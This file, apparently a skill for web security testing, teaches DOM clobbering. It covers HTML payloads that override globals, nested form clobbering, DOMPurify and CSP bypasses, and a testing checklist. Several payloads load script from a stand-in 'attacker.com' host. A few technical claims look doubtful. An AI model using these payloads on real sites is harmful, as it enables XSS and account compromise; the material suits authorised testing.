---
name: dom-clobbering
description: DOM clobbering attacks that override global JavaScript variables using HTML elements to achieve XSS
---

# DOM Clobbering

DOM clobbering exploits the legacy browser behavior where named HTML elements are accessible as global JavaScript properties. By injecting HTML with `id` or `name` attributes, attackers can overwrite global variables, configuration objects, and function references — leading to XSS even without direct script injection.

## Attack Surface

**Vulnerable Patterns**
- Apps that check `window.X || defaultValue` before sanitizing
- Configuration objects set by HTML attributes: `<meta name="config" content="...">`
- Script tags referencing `window.config`, `window.data`, `window.user`
- Libraries (DOMPurify < 2.x, older sanitizers) that pass clobbering vectors

**HTML Injection Without Script Tags**
- Sanitizers that allow `id` and `name` attributes
- HTML sanitizers that permit `<a>`, `<form>`, `<input>`, `<img>` but block `<script>`
- Markdown renderers, rich text editors, user profile fields

## Clobbering Mechanics

Named HTML elements become global properties:
```html
<img id="x"> → window.x === document.getElementById('x') (HTMLElement)
<a id="x" href="//attacker">  → window.x.toString() === "//attacker"
<form id="x"><input name="y">  → window.x.y === <input> element
```

Key properties:
- `<a id="X" href="Y">` → `window.X` is element, `window.X.href` is "Y" (absolute URL)
- `<a id="X" name="X" href="Y">` → Two elements with same name create HTMLCollection
- `window.X[0]` and `window.X[1]` accessible via indexed collection
- `toString()` on anchor returns `href` value

## Key Vulnerabilities

### Clobbering Configuration Objects

```javascript
// Vulnerable app code
var config = window.config || {};
var baseUrl = config.baseUrl || '/api/';
fetch(baseUrl + endpoint);
```

Inject:
```html
<a id="config" href="//attacker.com/">
```
Result: `config.baseUrl` resolved, `toString()` returns `//attacker.com/`

### Clobbering `document.getElementById`

```html
<!-- Inject: -->
<form id="x"><input id="attributes"></form>
<!-- Now: document.getElementById('x').attributes is the <input> element -->
<!-- Not the real NamedNodeMap -->
```

### Nested Clobbering with Forms

```html
<form id="obj"><input name="key" value="evil"></form>
<!-- window.obj.key === <input> element -->
<!-- window.obj.key.value === "evil" -->

<!-- For objects with two levels: -->
<form name="a"><input name="b" value="clobbered"></form>
<!-- window.a.b.value === "clobbered" -->
```

### HTMLCollection Clobbering

When two elements share the same `id`, `window[id]` becomes an HTMLCollection:
```html
<a id="x">first</a>
<a id="x" href="javascript:alert(1)">second</a>
<!-- window.x[0] = first anchor, window.x[1] = second anchor -->
<!-- window.x[0].toString() = page URL, window.x[1].toString() = "javascript:alert(1)" -->
```

### Clobbering DOMPurify Internals

DOMPurify < 2.0.17 was bypassed:
```html
<form id="DOMPurify"><input name="removed"></form>
<!-- Clobbers DOMPurify.removed, breaking cleanup tracking -->
```

### Script Gadget Exploitation

Many libraries read `window.*` configuration:
```javascript
// jQuery Mobile
window.jQMobile.defaultPageTransition

// Angular
window.angular.callbacks

// Lodash templates
window._ = ...
```

Find gadgets in loaded libraries and craft clobbering payload targeting their config.

## Payload Examples

**Basic clobber to inject URL**
```html
<a id="cdnUrl" href="https://attacker.com/evil.js">x</a>
<!-- If app does: script.src = window.cdnUrl -->
```

**Nested property clobber**
```html
<form id="config">
  <input name="scriptUrl" value="//attacker.com/x.js">
</form>
<!-- window.config.scriptUrl === "//attacker.com/x.js" -->
```

**Boolean override**
```html
<img id="isAdmin">
<!-- window.isAdmin is truthy (HTMLElement) even though it should be false -->
```

**Function override**
```html
<img id="validate">
<!-- window.validate() now throws TypeError, bypassing validation check -->
<!-- if(window.validate && window.validate(input)) → TypeError = falsy in try/catch -->
```

## Bypass Techniques

**Bypassing DOMPurify**
```html
<!-- Clobber sanitizer state -->
<form id="DOMPurify"><input name="removed"></form>

<!-- Force sanitizer to use attacker-controlled document -->
<form id="document"><input name="getElementById"></form>
```

**Bypassing CSP with Clobbering**
```html
<!-- No inline script needed — clobber a src attribute -->
<a id="nonce" href="attacker-nonce-value">
<!-- If app reads: document.querySelector('script').nonce = window.nonce -->
```

**Chaining with Other Vulns**
- HTML injection → clobbering → XSS (avoid script tag requirement)
- Markdown with `id` attributes allowed → clobber → script gadget execution
- Prototype pollution + clobbering for deeper property chains

## Testing Methodology

1. **Find HTML injection** — Any field that renders user HTML without full script-tag blocking
2. **Map global variables** — Read app JS, identify `window.X` references with falsy checks
3. **Identify gadgets** — Which variables are used as URLs, function refs, or booleans
4. **Test clobber** — Inject `<a id="X" href="payload">` and observe behavior
5. **Check sanitizer version** — Test DOMPurify/sanitize-html versions for known bypasses
6. **Enumerate loaded libraries** — Each has clobberable config properties
7. **Test form+input for nested** — `<form id="a"><input name="b">` for `a.b`

## Validation

1. Show HTML payload (no `<script>`) that causes JavaScript execution or unexpected behavior
2. Demonstrate the clobbered variable is read by app code
3. Prove execution context (XSS via gadget, URL redirection, auth bypass)

## False Positives

- App code uses local variables, not `window.*` references
- Sanitizer strips `id` and `name` attributes
- CSP blocks the subsequent resource load triggered by clobbered URL
- No script gadgets present in loaded JavaScript

## Impact

- XSS in applications that only filter `<script>` tags but allow `id`/`name` attributes
- Authentication bypass when clobbering boolean/admin checks
- Data exfiltration via clobbered endpoint URLs
- Persistent XSS if injection is stored

## Pro Tips

1. DOM Invader (Burp) automatically detects clobbering vectors and gadgets
2. Focus on libraries: `angular`, `jquery.mobile`, `lodash`, `handlebars` all have gadgets
3. `<a href>` is the most powerful primitive — it gives you a URL-string via `toString()`
4. Look for `window.X = window.X || {}` — that `||` is the clobbering entry point
5. Test in Chrome and Firefox — behavior of `window[id]` differs slightly
6. `name` attribute on `<iframe>` also clobbers `window.name` — useful in postMessage chains
7. Combine with prototype pollution for multi-level property chains

## Summary

DOM clobbering bypasses sanitizers that block scripts but allow harmless-looking elements. Named HTML elements override global JavaScript variables, enabling XSS through existing code gadgets. Test any HTML injection point where the sanitizer permits `id` or `name` attributes.
